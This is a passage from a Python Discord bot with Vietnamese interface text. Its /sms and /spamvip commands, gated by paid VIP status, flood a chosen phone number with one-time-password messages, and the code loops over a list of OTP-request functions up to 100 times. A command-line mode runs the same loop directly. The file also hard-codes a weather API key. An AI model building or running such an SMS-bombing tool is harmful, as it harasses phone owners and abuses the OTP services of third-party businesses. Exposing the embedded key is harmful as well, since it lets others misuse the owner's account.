    bot.active_spam = True
    bot.current_user_id = user_id
    
    log_command(interaction.user.id, interaction.user.name, "/sms", f"Phone: {phone}, Count: {count}", interaction)
    
    await interaction.response.send_message(f"📱 **Bắt đầu spam SMS** đến `{phone}` (`{count}` lần)...")
    
  
    await run_spam(interaction, phone, count, is_vip=False)

@bot.tree.command(name="spamvip", description="Spam SMS VIP (cần có VIP)")
@app_commands.describe(
    phone="Số điện thoại cần spam (10 số)",
    count="Số lần spam (1-100)"
)
async def spamvip_command(interaction: discord.Interaction, phone: str, count: int):
    if not bot.is_bot_active:
        await interaction.response.send_message("❌ Bot hiện đang tắt!", ephemeral=True)
        return
    

    if not is_admin(interaction.user.id) and not check_vip(interaction.user.id):
        await interaction.response.send_message("❌ Bạn cần **VIP** để dùng lệnh này!\nLiên hệ admin để mua VIP.", ephemeral=True)
        return
    
  
    if not phone.isdigit() or len(phone) != 10:
        await interaction.response.send_message("❌ Số điện thoại không hợp lệ! Vui lòng nhập 10 số.", ephemeral=True)
        return
    

    if count < 1 or count > 100:
        await interaction.response.send_message("❌ Số lần spam phải từ 1 đến 100!", ephemeral=True)
        return
    

    if phone in bot.banned_numbers:
        await interaction.response.send_message("❌ Số điện thoại này đã bị cấm spam!", ephemeral=True)
        return
    

    if bot.active_spam:
        await interaction.response.send_message("❌ Đang có spam chạy! Dùng `/stopspam` để dừng.", ephemeral=True)
        return
    
    bot.active_spam = True
    bot.current_user_id = interaction.user.id
    
    log_command(interaction.user.id, interaction.user.name, "/spamvip", f"Phone: {phone}, Count: {count}", interaction)
    
    await interaction.response.send_message(f"👑 **Bắt đầu spam VIP** đến `{phone}` (`{count}` lần)...")
    

    await run_spam(interaction, phone, count, is_vip=True)

@bot.tree.command(name="stopspam", description="Dừng spam đang chạy")
async def stopspam_command(interaction: discord.Interaction):
    if not bot.is_bot_active and not is_admin(interaction.user.id):
        await interaction.response.send_message("❌ Bot hiện đang tắt!", ephemeral=True)
        return
    
    if not bot.active_spam:
        await interaction.response.send_message("ℹ️ **Không có** spam nào đang chạy.", ephemeral=True)
        return
    
    if bot.current_user_id != interaction.user.id and not is_admin(interaction.user.id):
        await interaction.response.send_message("❌ Bạn không thể dừng spam của người khác!", ephemeral=True)
        return
    
    log_command(interaction.user.id, interaction.user.name, "/stopspam", "Dừng spam", interaction)
    bot.active_spam = False
    await interaction.response.send_message("⏹️ **Đã yêu cầu dừng spam!**")

@bot.tree.command(name="weather", description="Xem thông tin thời tiết")
@app_commands.describe(city="Tên thành phố (ví dụ: Hanoi, Ho Chi Minh)")
async def weather_command(interaction: discord.Interaction, city: str):
    if not bot.is_bot_active and not is_admin(interaction.user.id):
        await interaction.response.send_message("❌ Bot hiện đang tắt!", ephemeral=True)
        return
    
    await interaction.response.defer()
    
    log_command(interaction.user.id, interaction.user.name, "/weather", f"City: {city}", interaction)
    

    if interaction.channel:
        if isinstance(interaction.channel, discord.DMChannel):
            channel_name = "DM"
        elif isinstance(interaction.channel, discord.GroupChannel):
            channel_name = "Group"
        else:
            channel_name = interaction.channel.name
    else:
        channel_name = "Unknown"
    
    try:
        api_key = "8eb6660f9b1b6915bbbddf2f97f7f711"
        url = f"http://api.openweathermap.org/data/2.5/weather?q={city}&appid={api_key}&units=metric&lang=vi"
        
        async with aiohttp.ClientSession() as session:
            async with session.get(url) as response:
                if response.status != 200:
                    log_weather(interaction.user.id, interaction.user.name, city, "Không tìm thấy", channel_name)
                    await interaction.followup.send(f"❌ **Không tìm thấy** thành phố `{city}`!")
                    return
                
                data = await response.json()
        

        temp = data['main']['temp']
        feels_like = data['main']['feels_like']
        humidity = data['main']['humidity']
        pressure = data['main']['pressure']
        wind_speed = data['wind']['speed']
        clouds = data['clouds']['all']
        weather_desc = data['weather'][0]['description']
        country = data['sys']['country']
        
        embed = discord.Embed(
            title=f"🌤️ THỜI TIẾT {city.upper()}, {country}",
            color=discord.Color.blue()
        )
        embed.add_field(name="🌡️ Nhiệt độ", value=f"**{temp}°C**", inline=True)
        embed.add_field(name="🤔 Cảm giác như", value=f"**{feels_like}°C**", inline=True)
        embed.add_field(name="💧 Độ ẩm", value=f"**{humidity}%**", inline=True)
        embed.add_field(name="💨 Gió", value=f"**{wind_speed} m/s**", inline=True)
        embed.add_field(name="📊 Áp suất", value=f"**{pressure} hPa**", inline=True)
        embed.add_field(name="☁️ Mây", value=f"**{clouds}%**", inline=True)
        embed.set_footer(text=f"📝 {weather_desc.capitalize()}")
        
        log_weather(interaction.user.id, interaction.user.name, city, "Thành công", channel_name)
        await interaction.followup.send(embed=embed)
        
    except Exception as e:
        log_weather(interaction.user.id, interaction.user.name, city, f"Lỗi: {str(e)}", channel_name)
        await interaction.followup.send(f"❌ **Lỗi:** `{str(e)}`")


@bot.tree.command(name="on", description="Bật bot (Admin only)")
async def on_command(interaction: discord.Interaction):
    if not is_admin(interaction.user.id):
        await interaction.response.send_message("❌ Bạn không có quyền dùng lệnh này!", ephemeral=True)
        return
    
    bot.is_bot_active = True
    log_admin_action(interaction.user.id, interaction.user.name, "BẬT BOT", "Bot đã được bật", interaction)
    
    embed = discord.Embed(
        title="✅ BOT ĐÃ ĐƯỢC BẬT",
        description="Tất cả người dùng có thể sử dụng bot.",
        color=discord.Color.green()
    )
    await interaction.response.send_message(embed=embed)

@bot.tree.command(name="off", description="Tắt bot (Admin only)")
async def off_command(interaction: discord.Interaction):
    if not is_admin(interaction.user.id):
        await interaction.response.send_message("❌ Bạn không có quyền dùng lệnh này!", ephemeral=True)
        return
    
    bot.is_bot_active = False
    log_admin_action(interaction.user.id, interaction.user.name, "TẮT BOT", "Bot đã được tắt", interaction)
    
    embed = discord.Embed(
        title="🔴 BOT ĐÃ ĐƯỢC TẮT",
        description="Chỉ admin mới có thể sử dụng bot.",
        color=discord.Color.red()
    )
    await interaction.response.send_message(embed=embed)

@bot.tree.command(name="addvip", description="Thêm user VIP (Admin only)")
@app_commands.describe(
    user="User cần thêm VIP",
    days="Số ngày VIP"
)
async def addvip_command(interaction: discord.Interaction, user: discord.User, days: int):
    if not is_admin(interaction.user.id):
        await interaction.response.send_message("❌ Bạn không có quyền dùng lệnh này!", ephemeral=True)
        return
    
    current_time = datetime.datetime.now()
    expiration = current_time + datetime.timedelta(days=days)
    
    save_user(user.id, expiration, 'VIP')
    
    log_admin_action(
        interaction.user.id, 
        interaction.user.name, 
        "THÊM VIP", 
        f"User: {user.name} (ID: {user.id}), Days: {days}, Hết hạn: {expiration.strftime('%Y-%m-%d %H:%M:%S')}", 
        interaction
    )
    
    embed = discord.Embed(
        title="✅ ĐÃ THÊM VIP",
        color=discord.Color.gold()
    )
    embed.add_field(name="👤 User", value=user.mention, inline=True)
    embed.add_field(name="📅 Số ngày", value=f"**{days}** ngày", inline=True)
    embed.add_field(name="⏰ Hết hạn", value=f"`{expiration.strftime('%Y-%m-%d %H:%M:%S')}`", inline=True)
    
    await interaction.response.send_message(embed=embed)
    
    try:
        await user.send(f"🎉 **Chúc mừng!** Bạn đã được cấp **VIP {days} ngày**!")
    except:
        pass

@bot.tree.command(name="removevip", description="Xóa user VIP (Admin only)")
@app_commands.describe(user="User cần xóa VIP")
async def removevip_command(interaction: discord.Interaction, user: discord.User):
    if not is_admin(interaction.user.id):
        await interaction.response.send_message("❌ Bạn không có quyền dùng lệnh này!", ephemeral=True)
        return
    
    remove_user(user.id)
    
    log_admin_action(
        interaction.user.id, 
        interaction.user.name, 
        "XÓA VIP", 
        f"User: {user.name} (ID: {user.id})", 
        interaction
    )
    
    embed = discord.Embed(
        title="✅ ĐÃ XÓA VIP",
        description=f"Đã xóa VIP của {user.mention}",
        color=discord.Color.red()
    )
    
    await interaction.response.send_message(embed=embed)

@bot.tree.command(name="profile", description="Xem thông tin user")
@app_commands.describe(user="User cần xem (mặc định là bạn)")
async def profile_command(interaction: discord.Interaction, user: Optional[discord.User] = None):
    if not bot.is_bot_active and not is_admin(interaction.user.id):
        await interaction.response.send_message("❌ Bot hiện đang tắt!", ephemeral=True)
        return
    
    if user is None:
        user = interaction.user

    is_user_admin = is_admin(user.id)
    

    is_vip = check_vip(user.id)

    cursor.execute('''
        SELECT COUNT(*) FROM usage_history WHERE user_id = ?
    ''', (user.id,))
    usage_count = cursor.fetchone()[0]
    
    embed = discord.Embed(
        title=f"📄 PROFILE: {user.display_name}",
        color=discord.Color.blue()
    )
    embed.set_thumbnail(url=user.display_avatar.url)
    embed.add_field(name="🆔 ID", value=f"`{user.id}`", inline=True)
    embed.add_field(name="👤 Username", value=f"@{user.name}", inline=True)
    embed.add_field(name="📊 Số lần dùng", value=f"`{usage_count}`", inline=True)
    
    if is_user_admin:
        embed.add_field(name="📊 Loại", value="👑 **ADMIN**", inline=True)
    elif is_vip:
        cursor.execute('SELECT expiration_time FROM users WHERE user_id = ?', (user.id,))
        result = cursor.fetchone()
        if result:
            expiration = datetime.datetime.strptime(result[0], '%Y-%m-%d %H:%M:%S')
            remaining = (expiration - datetime.datetime.now()).days
            embed.add_field(name="📊 Loại", value="💎 **VIP**", inline=True)
            embed.add_field(name="⏰ Còn lại", value=f"**{remaining}** ngày", inline=True)
    else:
        embed.add_field(name="📊 Loại", value="👤 **Thường**", inline=True)
    
    log_command(interaction.user.id, interaction.user.name, "/profile", f"Xem profile của {user.name}", interaction)
    await interaction.response.send_message(embed=embed)

@bot.tree.command(name="cpu", description="Xem thông tin CPU (Admin only)")
async def cpu_command(interaction: discord.Interaction):
    if not is_admin(interaction.user.id):
        await interaction.response.send_message("❌ Bạn không có quyền dùng lệnh này!", ephemeral=True)
        return
    
    cpu_percent = psutil.cpu_percent(interval=1)
    cpu_count = psutil.cpu_count()
    cpu_freq = psutil.cpu_freq()
    memory = psutil.virtual_memory()
    disk = psutil.disk_usage('/')
    
    embed = discord.Embed(
        title="🖥️ THÔNG TIN HỆ THỐNG",
        color=discord.Color.green()
    )
    embed.add_field(name="📊 CPU Usage", value=f"**{cpu_percent}%**", inline=True)
    embed.add_field(name="🔢 CPU Cores", value=f"**{cpu_count}**", inline=True)
    embed.add_field(name="⚡ CPU Speed", value=f"**{cpu_freq.current:.2f} MHz**" if cpu_freq else "N/A", inline=True)
    embed.add_field(name="💾 RAM Usage", value=f"**{memory.percent}%**", inline=True)
    embed.add_field(name="📀 RAM Available", value=f"**{memory.available / (1024**3):.2f} GB**", inline=True)
    embed.add_field(name="💽 Disk Usage", value=f"**{disk.percent}%**", inline=True)
    
    log_admin_action(interaction.user.id, interaction.user.name, "XEM CPU", f"CPU: {cpu_percent}%, RAM: {memory.percent}%", interaction)
    await interaction.response.send_message(embed=embed)

@bot.event
async def on_ready():
    logging.info(f'✅ Bot đã đăng nhập với tên: {bot.user.name}')
    logging.info(f'🆔 Bot ID: {bot.user.id}')
    logging.info(f'📊 Số lượng server: {len(bot.guilds)}')
    logging.info(f'📱 API Spam: {len(otp_functions)} dịch vụ')
    logging.info(f'📝 Log file: {LOG_FILE}')

    if not os.path.exists(LOG_FILE):
        with open(LOG_FILE, "w", encoding="utf-8") as f:
            f.write(f"=== LOG BOT KHỞI ĐỘNG LÚC {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')} ===\n")
    

    await bot.change_presence(
        activity=discord.Activity(
            type=discord.ActivityType.watching,
            name=f"/help | {len(otp_functions)} services"
        )
    )
    
    print("\n" + "="*60)
    print("🚀 BOT ĐÃ KHỞI ĐỘNG THÀNH CÔNG!")
    print("="*60)
    print(f"🤖 Tên bot: {bot.user.name}")
    print(f"🆔 Bot ID: {bot.user.id}")
    print(f"📊 Số server: {len(bot.guilds)}")
    print(f"📱 API Spam: {len(otp_functions)} dịch vụ")
    print(f"📝 Log file: {LOG_FILE}")
    print(f"👑 Admin IDs: {ADMIN_IDS}")
    print("="*60 + "\n")



if __name__ == "__main__":
    if len(sys.argv) == 3:
        # Lệnh chạy từ Web UI
        phone = sys.argv[1]
        try:
            count = int(sys.argv[2])
        except ValueError:
            count = 1
            
        print(f"Bắt đầu SMS Spam {phone} {count} lần...")
        for i in range(count):
            print(f"--- Lượt {i+1}/{count} ---")
            for func in otp_functions:
                try:
                    func(phone)
                except:
                    pass
                time.sleep(0.5)
        print("Hoàn tất SMS Spam!")
        sys.exit(0)

    # Nếu không truyền arguments thì chạy Discord Bot
    if DISCORD_TOKEN == "":
        print("❌ VUI LÒNG THAY TOKEN DISCORD CỦA BẠN!")
        print("📝 Mở file và thay DISCORD_TOKEN bằng token của bạn")
        sys.exit(1)
    
    try:
        bot.run(DISCORD_TOKEN)
    except discord.LoginFailure:
        print("❌ TOKEN KHÔNG HỢP LỆ! Vui lòng kiểm tra lại token.")
    except Exception as e:
        print(f"❌ LỖI: {e}")